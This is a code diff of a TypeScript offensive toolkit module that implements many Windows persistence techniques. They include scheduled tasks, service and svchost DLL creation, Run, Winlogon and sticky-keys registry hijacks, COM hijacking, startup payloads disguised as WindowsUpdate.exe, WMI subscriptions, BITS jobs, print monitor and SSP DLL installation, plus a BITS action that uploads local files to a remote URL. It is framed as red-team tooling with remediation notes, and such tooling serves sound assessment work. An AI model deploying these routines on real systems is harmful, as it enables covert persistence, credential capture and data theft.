@@ -28,7 +28,16 @@ export async function schtaskPersist(args: string[], timeout: number): Promise<H
         const hr = await cmd(hideCmd, timeout)
         output.push(hr.exitCode === 0 ? "[+] Task hidden via SD modification" : `[!] Hide failed: ${hr.stderr}`)
       }
-      findings.push({ checkId: "WIN-PERSIST-001", provider: "windows", severity: "critical", status: "DEPLOYED", resource: `schtask://${name}`, title: `Scheduled task persistence: ${name}`, details: `Trigger: ${trigger}, User: ${runAsUser}, Command: ${command}`, remediation: `Delete: schtasks /Delete /TN "${taskPath}" /F` })
+      findings.push({
+        checkId: "WIN-PERSIST-001",
+        provider: "windows",
+        severity: "critical",
+        status: "DEPLOYED",
+        resource: `schtask://${name}`,
+        title: `Scheduled task persistence: ${name}`,
+        details: `Trigger: ${trigger}, User: ${runAsUser}, Command: ${command}`,
+        remediation: `Delete: schtasks /Delete /TN "${taskPath}" /F`,
+      })
     }
     return { output: output.join("\n"), findings }
   }
@@ -121,23 +130,68 @@ export async function servicePersist(args: string[], timeout: number): Promise<H
       const query = await cmd(`sc qc "${name}"`, timeout)
       output.push(query.stdout || `[!] Service query failed: ${query.stderr}`)
       const r = await cmd(`sc config "${name}" binPath= "${command}" start= ${startType}`, timeout)
-      output.push(r.exitCode === 0 ? `[+] Service modified: ${name}\n    New path: ${command}` : `[!] Modify failed: ${r.stderr}`)
+      output.push(
+        r.exitCode === 0 ? `[+] Service modified: ${name}\n    New path: ${command}` : `[!] Modify failed: ${r.stderr}`,
+      )
     } else if (svchostGroup) {
-      const r1 = await cmd(`sc create "${name}" binPath= "%SystemRoot%\\System32\\svchost.exe -k ${svchostGroup}" type= share start= ${startType} DisplayName= "${name}"`, timeout)
+      const r1 = await cmd(
+        `sc create "${name}" binPath= "%SystemRoot%\\System32\\svchost.exe -k ${svchostGroup}" type= share start= ${startType} DisplayName= "${name}"`,
+        timeout,
+      )
       output.push(r1.stdout || r1.stderr)
-      const r2 = await cmd(`reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost" /v ${svchostGroup} /t REG_MULTI_SZ /d "${name}" /f`, timeout)
-      output.push(r2.exitCode === 0 ? `[+] Svchost group registered: ${svchostGroup}` : `[!] Svchost group failed: ${r2.stderr}`)
-      const r3 = await cmd(`reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\${name}\\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "${command}" /f`, timeout)
-      output.push(r3.exitCode === 0 ? `[+] DLL service created: ${name} in ${svchostGroup}\n    ServiceDll: ${command}` : `[!] ServiceDll failed: ${r3.stderr}`)
+      const r2 = await cmd(
+        `reg add "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost" /v ${svchostGroup} /t REG_MULTI_SZ /d "${name}" /f`,
+        timeout,
+      )
+      output.push(
+        r2.exitCode === 0 ? `[+] Svchost group registered: ${svchostGroup}` : `[!] Svchost group failed: ${r2.stderr}`,
+      )
+      const r3 = await cmd(
+        `reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\${name}\\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "${command}" /f`,
+        timeout,
+      )
+      output.push(
+        r3.exitCode === 0
+          ? `[+] DLL service created: ${name} in ${svchostGroup}\n    ServiceDll: ${command}`
+          : `[!] ServiceDll failed: ${r3.stderr}`,
+      )
     } else {
-      const r = await cmd(`sc create "${name}" binPath= "${command}" start= ${startType} DisplayName= "${name}"`, timeout)
-      output.push(r.exitCode === 0 ? `[+] Service created: ${name}\n    BinPath: ${command}` : `[!] Create failed: ${r.stderr}`)
+      const r = await cmd(
+        `sc create "${name}" binPath= "${command}" start= ${startType} DisplayName= "${name}"`,
+        timeout,
+      )
+      output.push(
+        r.exitCode === 0 ? `[+] Service created: ${name}\n    BinPath: ${command}` : `[!] Create failed: ${r.stderr}`,
+      )
     }
-    const recovery = await cmd(`sc failure "${name}" reset= 0 actions= restart/5000/restart/10000/restart/30000`, timeout)
-    output.push(recovery.exitCode === 0 ? "[+] Recovery configured: auto-restart on failure" : `[!] Recovery config failed: ${recovery.stderr}`)
+    const recovery = await cmd(
+      `sc failure "${name}" reset= 0 actions= restart/5000/restart/10000/restart/30000`,
+      timeout,
+    )
+    output.push(
+      recovery.exitCode === 0
+        ? "[+] Recovery configured: auto-restart on failure"
+        : `[!] Recovery config failed: ${recovery.stderr}`,
+    )
     output.push(`    Start type: ${startType}`)
-    if (output.some((o) => o.includes("[+] Service created") || o.includes("[+] Service modified") || o.includes("[+] DLL service created"))) {
-      findings.push({ checkId: "WIN-PERSIST-002", provider: "windows", severity: "critical", status: "DEPLOYED", resource: `service://${name}`, title: `Service persistence: ${name}`, details: `Action: ${action}, Command: ${command}`, remediation: `Delete: sc.exe delete ${name}` })
+    if (
+      output.some(
+        (o) =>
+          o.includes("[+] Service created") ||
+          o.includes("[+] Service modified") ||
+          o.includes("[+] DLL service created"),
+      )
+    ) {
+      findings.push({
+        checkId: "WIN-PERSIST-002",
+        provider: "windows",
+        severity: "critical",
+        status: "DEPLOYED",
+        resource: `service://${name}`,
+        title: `Service persistence: ${name}`,
+        details: `Action: ${action}, Command: ${command}`,
+        remediation: `Delete: sc.exe delete ${name}`,
+      })
     }
     return { output: output.join("\n"), findings }
   }
@@ -231,12 +285,32 @@ export async function registryPersist(args: string[], timeout: number): Promise<
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== Registry Persistence (cmd.exe) ===\n")
     const regLocs: Record<string, { path: string; name: string; value: string }> = {
-      run: { path: `${key}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`, name: "CyberStrikeUpdate", value: command },
-      winlogon: { path: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`, name: method === "winlogon" ? "Userinit" : "Shell", value: method === "winlogon" ? `C:\\Windows\\System32\\userinit.exe,${command}` : `explorer.exe,${command}` },
-      ifeo: { path: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe`, name: "Debugger", value: command },
-      appinit: { path: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows`, name: "AppInit_DLLs", value: command },
+      run: {
+        path: `${key}\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`,
+        name: "CyberStrikeUpdate",
+        value: command,
+      },
+      winlogon: {
+        path: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`,
+        name: method === "winlogon" ? "Userinit" : "Shell",
+        value: method === "winlogon" ? `C:\\Windows\\System32\\userinit.exe,${command}` : `explorer.exe,${command}`,
+      },
+      ifeo: {
+        path: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe`,
+        name: "Debugger",
+        value: command,
+      },
+      appinit: {
+        path: `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows`,
+        name: "AppInit_DLLs",
+        value: command,
+      },
       screensaver: { path: `HKCU\\Control Panel\\Desktop`, name: "SCRNSAVE.EXE", value: command },
-      explorer: { path: `${key}\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`, name: "Shell", value: `explorer.exe,${command}` },
+      explorer: {
+        path: `${key}\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon`,
+        name: "Shell",
+        value: `explorer.exe,${command}`,
+      },
       logonscript: { path: `HKCU\\Environment`, name: "UserInitMprLogonScript", value: command },
     }
     const loc = regLocs[method] || regLocs.run
@@ -254,7 +328,16 @@ export async function registryPersist(args: string[], timeout: number): Promise<
       output.push("[+] Screensaver enabled with 5 min timeout")
     }
     if (r.exitCode === 0) {
-      findings.push({ checkId: "WIN-PERSIST-003", provider: "windows", severity: "critical", status: "DEPLOYED", resource: `registry://${loc.path}\\${loc.name}`, title: `Registry persistence: ${method}`, details: `Path: ${loc.path}\\${loc.name} = ${loc.value}`, remediation: `Remove: reg delete "${loc.path}" /v "${loc.name}" /f` })
+      findings.push({
+        checkId: "WIN-PERSIST-003",
+        provider: "windows",
+        severity: "critical",
+        status: "DEPLOYED",
+        resource: `registry://${loc.path}\\${loc.name}`,
+        title: `Registry persistence: ${method}`,
+        details: `Path: ${loc.path}\\${loc.name} = ${loc.value}`,
+        remediation: `Remove: reg delete "${loc.path}" /v "${loc.name}" /f`,
+      })
     }
     return { output: output.join("\n"), findings }
   }
@@ -406,11 +489,24 @@ export async function wmiPersist(args: string[], timeout: number): Promise<HookR
     output.push(`    Or use wmic to set individual instances (limited)`)
     output.push(`\n[*] Alternative: Use mofcomp with inline MOF:`)
     output.push(`    echo #pragma namespace("\\\\\\\\.\\\\root\\\\subscription") > %TEMP%\\cs.mof`)
-    output.push(`    echo instance of __EventFilter as $f { Name="${name}_Filter"; EventNamespace="root\\\\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"; }; >> %TEMP%\\cs.mof`)
-    output.push(`    echo instance of CommandLineEventConsumer as $c { Name="${name}_Consumer"; CommandLineTemplate="cmd.exe /c ${command}"; }; >> %TEMP%\\cs.mof`)
+    output.push(
+      `    echo instance of __EventFilter as $f { Name="${name}_Filter"; EventNamespace="root\\\\cimv2"; QueryLanguage="WQL"; Query="SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"; }; >> %TEMP%\\cs.mof`,
+    )
+    output.push(
+      `    echo instance of CommandLineEventConsumer as $c { Name="${name}_Consumer"; CommandLineTemplate="cmd.exe /c ${command}"; }; >> %TEMP%\\cs.mof`,
+    )
     output.push(`    echo instance of __FilterToConsumerBinding { Filter=$f; Consumer=$c; }; >> %TEMP%\\cs.mof`)
     output.push(`    mofcomp %TEMP%\\cs.mof`)
-    findings.push({ checkId: "WIN-PERSIST-004", provider: "windows", severity: "info", status: "GUIDANCE", resource: `wmi://subscription/${name}`, title: `WMI persistence guidance (cmd mode)`, details: `Full WMI subscription creation requires PS or mofcomp. Command: ${command}`, remediation: "Use PowerShell exec mode for full WMI support" })
+    findings.push({
+      checkId: "WIN-PERSIST-004",
+      provider: "windows",
+      severity: "info",
+      status: "GUIDANCE",
+      resource: `wmi://subscription/${name}`,
+      title: `WMI persistence guidance (cmd mode)`,
+      details: `Full WMI subscription creation requires PS or mofcomp. Command: ${command}`,
+      remediation: "Use PowerShell exec mode for full WMI support",
+    })
     return { output: output.join("\n"), findings }
   }
 
@@ -516,15 +612,45 @@ export async function comHijack(args: string[], timeout: number): Promise<HookRe
         }
       }
       output.push(`\n[+] Total hijackable: ${hijackable}`)
-      if (hijackable > 0) findings.push({ checkId: "WIN-PERSIST-005", provider: "windows", severity: "info", status: "ENUMERATED", resource: "com://scan", title: `${hijackable} hijackable COM objects found`, details: "CLSIDs in HKLM but not HKCU — user can override without admin", remediation: "Monitor HKCU\\SOFTWARE\\Classes\\CLSID for unauthorized entries" })
+      if (hijackable > 0)
+        findings.push({
+          checkId: "WIN-PERSIST-005",
+          provider: "windows",
+          severity: "info",
+          status: "ENUMERATED",
+          resource: "com://scan",
+          title: `${hijackable} hijackable COM objects found`,
+          details: "CLSIDs in HKLM but not HKCU — user can override without admin",
+          remediation: "Monitor HKCU\\SOFTWARE\\Classes\\CLSID for unauthorized entries",
+        })
     }
     if (action === "hijack" && clsid && dllPath) {
       const r1 = await cmd(`reg query "HKLM\\SOFTWARE\\Classes\\CLSID\\${clsid}\\InprocServer32" /ve`, timeout)
       output.push(`[*] Original HKLM DLL: ${r1.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || "unknown"}`)
-      const r2 = await cmd(`reg add "HKCU\\SOFTWARE\\Classes\\CLSID\\${clsid}\\InprocServer32" /ve /t REG_SZ /d "${dllPath}" /f`, timeout)
-      const r3 = await cmd(`reg add "HKCU\\SOFTWARE\\Classes\\CLSID\\${clsid}\\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Both" /f`, timeout)
-      output.push(r2.exitCode === 0 ? `[+] COM hijack set:\n    CLSID: ${clsid}\n    DLL: ${dllPath}` : `[!] Failed: ${r2.stderr}`)
-      if (r2.exitCode === 0) findings.push({ checkId: "WIN-PERSIST-005", provider: "windows", severity: "critical", status: "DEPLOYED", resource: `com://${clsid}`, title: `COM object hijacked: ${clsid}`, details: `DLL: ${dllPath}`, remediation: `Remove: reg delete "HKCU\\SOFTWARE\\Classes\\CLSID\\${clsid}" /f` })
+      const r2 = await cmd(
+        `reg add "HKCU\\SOFTWARE\\Classes\\CLSID\\${clsid}\\InprocServer32" /ve /t REG_SZ /d "${dllPath}" /f`,
+        timeout,
+      )
+      const r3 = await cmd(
+        `reg add "HKCU\\SOFTWARE\\Classes\\CLSID\\${clsid}\\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Both" /f`,
+        timeout,
+      )
+      output.push(
+        r2.exitCode === 0
+          ? `[+] COM hijack set:\n    CLSID: ${clsid}\n    DLL: ${dllPath}`
+          : `[!] Failed: ${r2.stderr}`,
+      )
+      if (r2.exitCode === 0)
+        findings.push({
+          checkId: "WIN-PERSIST-005",
+          provider: "windows",
+          severity: "critical",
+          status: "DEPLOYED",
+          resource: `com://${clsid}`,
+          title: `COM object hijacked: ${clsid}`,
+          details: `DLL: ${dllPath}`,
+          remediation: `Remove: reg delete "HKCU\\SOFTWARE\\Classes\\CLSID\\${clsid}" /f`,
+        })
     }
     return { output: output.join("\n"), findings }
   }
@@ -661,19 +787,49 @@ export async function startupPersist(args: string[], timeout: number): Promise<H
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== Startup Persistence (cmd.exe) ===\n")
     if (method === "startup" || !method) {
-      const startupDir = target === "ALL" ? "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" : "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+      const startupDir =
+        target === "ALL"
+          ? "%ProgramData%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+          : "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
       const r = await cmd(`copy "${payload}" "${startupDir}\\WindowsUpdate.exe" /Y`, timeout)
-      output.push(r.exitCode === 0 ? `[+] Payload copied to startup folder\n    Path: ${startupDir}\\WindowsUpdate.exe\n    Scope: ${target}` : `[!] Copy failed: ${r.stderr}\n[*] Alternative: use shortcut via PS or direct copy`)
-      if (r.exitCode === 0) findings.push({ checkId: "WIN-PERSIST-006", provider: "windows", severity: "critical", status: "DEPLOYED", resource: `startup://${method}`, title: `Startup persistence: ${method}`, details: `Payload: ${payload}, Scope: ${target}`, remediation: `Delete: del "${startupDir}\\WindowsUpdate.exe"` })
+      output.push(
+        r.exitCode === 0
+          ? `[+] Payload copied to startup folder\n    Path: ${startupDir}\\WindowsUpdate.exe\n    Scope: ${target}`
+          : `[!] Copy failed: ${r.stderr}\n[*] Alternative: use shortcut via PS or direct copy`,
+      )
+      if (r.exitCode === 0)
+        findings.push({
+          checkId: "WIN-PERSIST-006",
+          provider: "windows",
+          severity: "critical",
+          status: "DEPLOYED",
+          resource: `startup://${method}`,
+          title: `Startup persistence: ${method}`,
+          details: `Payload: ${payload}, Scope: ${target}`,
+          remediation: `Delete: del "${startupDir}\\WindowsUpdate.exe"`,
+        })
     }
     if (method === "gpo_script") {
-      const scriptDir = target === "ALL" ? "%SystemRoot%\\System32\\GroupPolicy\\Machine\\Scripts\\Startup" : "%SystemRoot%\\System32\\GroupPolicy\\User\\Scripts\\Logon"
+      const scriptDir =
+        target === "ALL"
+          ? "%SystemRoot%\\System32\\GroupPolicy\\Machine\\Scripts\\Startup"
+          : "%SystemRoot%\\System32\\GroupPolicy\\User\\Scripts\\Logon"
       await cmd(`mkdir "${scriptDir}" 2>nul`, timeout)
       const r = await cmd(`copy "${payload}" "${scriptDir}\\update.bat" /Y`, timeout)
       output.push(r.exitCode === 0 ? `[+] GPO script placed: ${scriptDir}\\update.bat` : `[!] Failed: ${r.stderr}`)
       const gpupdate = await cmd("gpupdate /force", timeout)
       output.push(gpupdate.exitCode === 0 ? "[+] GPO updated" : "[!] gpupdate failed")
-      if (r.exitCode === 0) findings.push({ checkId: "WIN-PERSIST-006", provider: "windows", severity: "critical", status: "DEPLOYED", resource: `startup://gpo_script`, title: `GPO startup script persistence`, details: `Payload: ${payload}, Scope: ${target}`, remediation: `Delete script from GPO path` })
+      if (r.exitCode === 0)
+        findings.push({
+          checkId: "WIN-PERSIST-006",
+          provider: "windows",
+          severity: "critical",
+          status: "DEPLOYED",
+          resource: `startup://gpo_script`,
+          title: `GPO startup script persistence`,
+          details: `Payload: ${payload}, Scope: ${target}`,
+          remediation: `Delete script from GPO path`,
+        })
     }
     if (method === "wmi_namespace" || method === "office_macro") {
       output.push(`[*] ${method} requires PowerShell — use PS exec mode for full support`)
@@ -849,7 +1005,9 @@ export async function gpoAbuse(args: string[], timeout: number): Promise<HookRes
     if (action === "create_task" && command) {
       output.push("[*] Manual steps for GPO scheduled task injection:")
       output.push(`    1. Find GPO SysVol path: net share | findstr SYSVOL`)
-      output.push(`    2. Navigate to: \\\\DOMAIN\\SYSVOL\\domain\\Policies\\{GPO_GUID}\\Machine\\Preferences\\ScheduledTasks\\`)
+      output.push(
+        `    2. Navigate to: \\\\DOMAIN\\SYSVOL\\domain\\Policies\\{GPO_GUID}\\Machine\\Preferences\\ScheduledTasks\\`,
+      )
       output.push(`    3. Create ScheduledTasks.xml with ImmediateTaskV2 node`)
       output.push(`    4. Command: ${command}`)
       output.push(`    5. Force update: gpupdate /force /target:computer`)
@@ -866,7 +1024,16 @@ export async function gpoAbuse(args: string[], timeout: number): Promise<HookRes
       output.push("[*] GPO linking requires AD tools (dsmod, ldifde, or PS)")
       output.push(`[*] Alternative: dsmod ou "${ouDn}" -gplinkgpo "{GPO_GUID}"`)
     }
-    findings.push({ checkId: "WIN-GPO-CMD", provider: "windows", severity: "info", status: "GUIDANCE", resource: `gpo://${gpoName}`, title: `GPO abuse guidance (cmd mode)`, details: `Full GPO manipulation requires PS or AD tools. Action: ${action}`, remediation: "Use PowerShell exec mode for full GPO support" })
+    findings.push({
+      checkId: "WIN-GPO-CMD",
+      provider: "windows",
+      severity: "info",
+      status: "GUIDANCE",
+      resource: `gpo://${gpoName}`,
+      title: `GPO abuse guidance (cmd mode)`,
+      details: `Full GPO manipulation requires PS or AD tools. Action: ${action}`,
+      remediation: "Use PowerShell exec mode for full GPO support",
+    })
     return { output: output.join("\n"), findings }
   }
 
@@ -1109,10 +1276,23 @@ export async function bitsPersist(args: string[], timeout: number): Promise<Hook
       const r = await cmd("bitsadmin /list /allusers /verbose", timeout)
       output.push(r.stdout || "(no BITS jobs found)")
       const hasSuspicious = r.stdout.includes("NOTIFICATION COMMAND LINE")
-      if (hasSuspicious) findings.push({ checkId: "WIN-BITS-001", provider: "windows", severity: "high", status: "SUSPICIOUS", resource: "bits://jobs", title: "BITS job with notification command found", details: "A BITS job has notification command configured — possible persistence", remediation: "Remove: bitsadmin /cancel JOB_NAME" })
+      if (hasSuspicious)
+        findings.push({
+          checkId: "WIN-BITS-001",
+          provider: "windows",
+          severity: "high",
+          status: "SUSPICIOUS",
+          resource: "bits://jobs",
+          title: "BITS job with notification command found",
+          details: "A BITS job has notification command configured — possible persistence",
+          remediation: "Remove: bitsadmin /cancel JOB_NAME",
+        })
     }
     if (action === "create") {
-      if (!command) { output.push("ERROR: --command required"); return { output: output.join("\n"), findings } }
+      if (!command) {
+        output.push("ERROR: --command required")
+        return { output: output.join("\n"), findings }
+      }
       const downloadUrl = url || "https://live.sysinternals.com/autoruns.exe"
       const localPath = localFile || "%TEMP%\\update-check.tmp"
       const r1 = await cmd(`bitsadmin /create /download "${name}"`, timeout)
@@ -1125,19 +1305,38 @@ export async function bitsPersist(args: string[], timeout: number): Promise<Hook
       await cmd(`bitsadmin /setminretrydelay "${name}" ${parseInt(interval) * 60}`, timeout)
       await cmd(`bitsadmin /setnoprogresstimeout "${name}" 0`, timeout)
       const resume = await cmd(`bitsadmin /resume "${name}"`, timeout)
-      output.push(resume.exitCode === 0 ? `[+] BITS persistence created: ${name}\n    Command: ${command}\n    Retry: every ${interval} min` : `[!] Resume failed: ${resume.stderr}`)
-      if (resume.exitCode === 0) findings.push({ checkId: "WIN-BITS-010", provider: "windows", severity: "critical", status: "PERSISTED", resource: `bits://${name}`, title: `BITS persistence: ${name}`, details: `Command: ${command}, retry: ${interval} min`, remediation: `Remove: bitsadmin /cancel "${name}"` })
+      output.push(
+        resume.exitCode === 0
+          ? `[+] BITS persistence created: ${name}\n    Command: ${command}\n    Retry: every ${interval} min`
+          : `[!] Resume failed: ${resume.stderr}`,
+      )
+      if (resume.exitCode === 0)
+        findings.push({
+          checkId: "WIN-BITS-010",
+          provider: "windows",
+          severity: "critical",
+          status: "PERSISTED",
+          resource: `bits://${name}`,
+          title: `BITS persistence: ${name}`,
+          details: `Command: ${command}, retry: ${interval} min`,
+          remediation: `Remove: bitsadmin /cancel "${name}"`,
+        })
     }
     if (action === "delete") {
       const r = await cmd(`bitsadmin /cancel "${name}"`, timeout)
       output.push(r.exitCode === 0 ? `[+] BITS job cancelled: ${name}` : `[!] Cancel failed: ${r.stderr}`)
     }
     if (action === "exfil") {
-      if (!url || !localFile) { output.push("ERROR: --url and --local-file required"); return { output: output.join("\n"), findings } }
+      if (!url || !localFile) {
+        output.push("ERROR: --url and --local-file required")
+        return { output: output.join("\n"), findings }
+      }
       const r1 = await cmd(`bitsadmin /create /upload "${name}-exfil"`, timeout)
       const r2 = await cmd(`bitsadmin /addfile "${name}-exfil" "${url}" "${localFile}"`, timeout)
       const r3 = await cmd(`bitsadmin /resume "${name}-exfil"`, timeout)
-      output.push(r3.exitCode === 0 ? `[+] BITS upload started: ${localFile} → ${url}` : `[!] Upload failed: ${r3.stderr}`)
+      output.push(
+        r3.exitCode === 0 ? `[+] BITS upload started: ${localFile} → ${url}` : `[!] Upload failed: ${r3.stderr}`,
+      )
     }
     return { output: output.join("\n"), findings }
   }
@@ -1370,8 +1569,14 @@ export async function wsusAbuse(args: string[], timeout: number): Promise<HookRe
   if (activeExec === "cmd" || activeExec === "bat") {
     output.push("=== WSUS Analysis (cmd.exe) ===\n")
     if (action === "enum" || action === "check") {
-      const wu = await cmd(`reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v WUServer`, timeout)
-      const wuStatus = await cmd(`reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v WUStatusServer`, timeout)
+      const wu = await cmd(
+        `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v WUServer`,
+        timeout,
+      )
+      const wuStatus = await cmd(
+        `reg query "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate" /v WUStatusServer`,
+        timeout,
+      )
       if (wu.exitCode === 0) {
         const wsusUrl = wu.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim() || ""
         output.push(`[*] WSUS Server: ${wsusUrl}`)
@@ -1379,9 +1584,27 @@ export async function wsusAbuse(args: string[], timeout: number): Promise<HookRe
         if (wsusUrl.startsWith("http://")) {
           output.push("\n[!] CRITICAL: WSUS uses HTTP — vulnerable to MITM update injection")
           output.push("[!] Tools: SharpWSUS, WSUSpendu for domain-wide SYSTEM execution")
-          findings.push({ checkId: "WIN-WSUS-001", provider: "windows", severity: "critical", status: "VULNERABLE", resource: wsusUrl, title: "WSUS over HTTP — update injection possible", details: `WSUS ${wsusUrl} uses HTTP. MITM allows injecting malicious updates as SYSTEM.`, remediation: "Configure WSUS to use HTTPS." })
+          findings.push({
+            checkId: "WIN-WSUS-001",
+            provider: "windows",
+            severity: "critical",
+            status: "VULNERABLE",
+            resource: wsusUrl,
+            title: "WSUS over HTTP — update injection possible",
+            details: `WSUS ${wsusUrl} uses HTTP. MITM allows injecting malicious updates as SYSTEM.`,
+            remediation: "Configure WSUS to use HTTPS.",
+          })
         }
-        findings.push({ checkId: "WIN-WSUS-002", provider: "windows", severity: "medium", status: "INFO", resource: wsusUrl, title: `WSUS server: ${wsusUrl}`, details: "Machine uses WSUS for updates.", remediation: "Ensure WSUS server is hardened and uses HTTPS." })
+        findings.push({
+          checkId: "WIN-WSUS-002",
+          provider: "windows",
+          severity: "medium",
+          status: "INFO",
+          resource: wsusUrl,
+          title: `WSUS server: ${wsusUrl}`,
+          details: "Machine uses WSUS for updates.",
+          remediation: "Ensure WSUS server is hardened and uses HTTPS.",
+        })
       } else {
         output.push("[*] No WSUS configuration — machine uses Windows Update directly")
       }
@@ -1683,19 +1906,43 @@ export async function printMonitorPersist(args: string[], timeout: number): Prom
       output.push("\n[*] Print Spooler:\n" + spooler.stdout)
     }
     if (action === "install") {
-      if (!dllPath) { output.push("ERROR: --dll required"); return { output: output.join("\n"), findings } }
+      if (!dllPath) {
+        output.push("ERROR: --dll required")
+        return { output: output.join("\n"), findings }
+      }
       const dllName = dllPath.split("\\").pop() || dllPath
       const copy = await cmd(`copy "${dllPath}" "%SystemRoot%\\System32\\${dllName}" /Y`, timeout)
       output.push(copy.exitCode === 0 ? `[+] DLL copied to System32` : `[!] Copy failed: ${copy.stderr}`)
       const regKey = `HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}`
       const r = await cmd(`reg add "${regKey}" /v "Driver" /t REG_SZ /d "${dllName}" /f`, timeout)
-      output.push(r.exitCode === 0 ? `[+] Print monitor registered: ${name}\n    Driver: ${dllName}` : `[!] Registry failed: ${r.stderr}`)
+      output.push(
+        r.exitCode === 0
+          ? `[+] Print monitor registered: ${name}\n    Driver: ${dllName}`
+          : `[!] Registry failed: ${r.stderr}`,
+      )
       const restart = await cmd("net stop Spooler && net start Spooler", timeout)
-      output.push(restart.exitCode === 0 ? "[+] Spooler restarted — DLL loaded as SYSTEM" : `[!] Spooler restart: ${restart.stderr}`)
-      if (r.exitCode === 0) findings.push({ checkId: "WIN-PMON-010", provider: "windows", severity: "critical", status: "PERSISTED", resource: `spooler://${name}`, title: `Print monitor installed: ${name}`, details: `DLL loaded by spoolsv.exe as SYSTEM. Survives reboots.`, remediation: `Remove: reg delete "${regKey}" /f && del "%SystemRoot%\\System32\\${dllName}"` })
+      output.push(
+        restart.exitCode === 0
+          ? "[+] Spooler restarted — DLL loaded as SYSTEM"
+          : `[!] Spooler restart: ${restart.stderr}`,
+      )
+      if (r.exitCode === 0)
+        findings.push({
+          checkId: "WIN-PMON-010",
+          provider: "windows",
+          severity: "critical",
+          status: "PERSISTED",
+          resource: `spooler://${name}`,
+          title: `Print monitor installed: ${name}`,
+          details: `DLL loaded by spoolsv.exe as SYSTEM. Survives reboots.`,
+          remediation: `Remove: reg delete "${regKey}" /f && del "%SystemRoot%\\System32\\${dllName}"`,
+        })
     }
     if (action === "remove") {
-      const driver = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}" /v "Driver"`, timeout)
+      const driver = await cmd(
+        `reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}" /v "Driver"`,
+        timeout,
+      )
       const dllName = driver.stdout.match(/REG_SZ\s+(.+)/)?.[1]?.trim()
       await cmd(`reg delete "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors\\${name}" /f`, timeout)
       if (dllName) await cmd(`del "%SystemRoot%\\System32\\${dllName}"`, timeout)
@@ -1949,15 +2196,31 @@ export async function sspPersist(args: string[], timeout: number): Promise<HookR
       const r = await cmd(`reg query "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa" /v "Security Packages"`, timeout)
       output.push("[*] Registered SSPs:\n" + (r.stdout || "(query failed)"))
       const known = ["kerberos", "msv1_0", "schannel", "wdigest", "tspkg", "pku2u", "cloudap", "negoexts", "negotiate"]
-      const pkgs = r.stdout.match(/REG_MULTI_SZ\s+([\s\S]*?)(?:\r?\n\r?\n|$)/)?.[1]?.trim().split(/\s+/) || []
+      const pkgs =
+        r.stdout
+          .match(/REG_MULTI_SZ\s+([\s\S]*?)(?:\r?\n\r?\n|$)/)?.[1]
+          ?.trim()
+          .split(/\s+/) || []
       const nonStd = pkgs.filter((p: string) => p && !known.includes(p.toLowerCase().replace(/\0/g, "")))
       if (nonStd.length > 0) {
         output.push(`\n[!] Non-standard SSPs: ${nonStd.join(", ")}`)
-        findings.push({ checkId: "WIN-SSP-001", provider: "windows", severity: "critical", status: "SUSPICIOUS", resource: "lsa://ssp", title: `${nonStd.length} non-standard SSP(s) found`, details: "Non-standard SSPs may capture plaintext credentials.", remediation: "Remove unknown SSPs from HKLM\\SYSTEM\\CCS\\Control\\Lsa\\Security Packages." })
+        findings.push({
+          checkId: "WIN-SSP-001",
+          provider: "windows",
+          severity: "critical",
+          status: "SUSPICIOUS",
+          resource: "lsa://ssp",
+          title: `${nonStd.length} non-standard SSP(s) found`,
+          details: "Non-standard SSPs may capture plaintext credentials.",
+          remediation: "Remove unknown SSPs from HKLM\\SYSTEM\\CCS\\Control\\Lsa\\Security Packages.",
+        })
       }
     }
     if (action === "install") {
-      if (!dll) { output.push("ERROR: --dll required"); return { output: output.join("\n"), findings } }
+      if (!dll) {
+        output.push("ERROR: --dll required")
+        return { output: output.join("\n"), findings }
+      }
       const dllName = dll.replace(/\\/g, "/").split("/").pop()?.replace(".dll", "") || name
       const copy = await cmd(`copy "${dll}" "%SystemRoot%\\System32\\" /Y`, timeout)
       output.push(copy.exitCode === 0 ? `[+] DLL copied to System32` : `[!] Copy failed: ${copy.stderr}`)
